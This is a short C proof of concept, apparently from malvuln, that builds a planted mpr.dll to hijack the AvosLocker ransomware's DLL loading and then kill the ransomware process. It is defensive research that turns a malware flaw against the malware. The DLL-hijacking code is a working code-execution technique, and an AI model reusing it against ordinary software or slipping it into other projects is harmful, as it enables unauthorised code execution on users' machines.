#include "windows.h"
#include "stdio.h"

//By malvuln - 5/2/2022
//Vuln: Code Execution
//Target: Ransom.AvosLocker
//MD5: 40f2238875fcbd2a92cfefc4846a15a8
/**DISCLAIMER:
Author is NOT responsible for any damages whatsoever by using this software or improper malware
handling. By using this code you assume and accept all risk implied or otherwise.
**/

//gcc -c mpr.c -m32
//gcc -shared -o mpr.dll mpr.o -m32

BOOL APIENTRY DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved){
  switch (reason) {
  case DLL_PROCESS_ATTACH:
   MessageBox(NULL, "Code Exec", "by malvuln", MB_OK);
   TCHAR buf[MAX_PATH];
   GetCurrentDirectory(MAX_PATH, TEXT(buf));
   //printf("Current directory: %s\n", buf);
   //check the path
   int rc = strcmp("C:\\Windows\\System32", TEXT(buf));
   	if(rc != 0){
   	HANDLE handle = OpenProcess(PROCESS_TERMINATE, FALSE, getpid());
     if (NULL != handle) {   
        TerminateProcess(handle, 0);
       CloseHandle(handle);
     }
   }
    break;
  }
  return TRUE;
}